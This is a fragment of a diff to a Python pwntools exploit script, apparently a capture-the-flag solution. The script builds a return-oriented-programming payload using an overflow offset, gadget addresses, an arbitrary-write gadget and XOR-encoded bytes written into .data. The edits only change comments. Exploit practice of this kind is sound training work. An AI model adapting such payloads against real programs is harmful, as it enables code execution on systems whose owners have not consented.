@@ -9,8 +9,8 @@ elf = ELF(challenge)
 function = elf.plt['print_file']
 rop = ROP(elf)
 xor = 0x08048547
-writter = 0x0804854F
-str_addr = 0x0804A018
+writter = 0x0804854F # arbitrary write
+str_addr = 0x0804A018 # This is in the .data section and we have
 
 def xor_str(addr_str):
     payload = b''
@@ -31,7 +31,7 @@ payload = cyclic(44)
 payload += p32(rop.esi.address)
 payload += b'dnce'
 payload += p32(str_addr) # This is in the .data section and we have 
-payload += p32(str_addr) # This is in the .data section and we have
+payload += p32(str_addr)
 payload += p32(writter)
 payload += xor_str(str_addr)
 payload += p32(rop.esi.address)
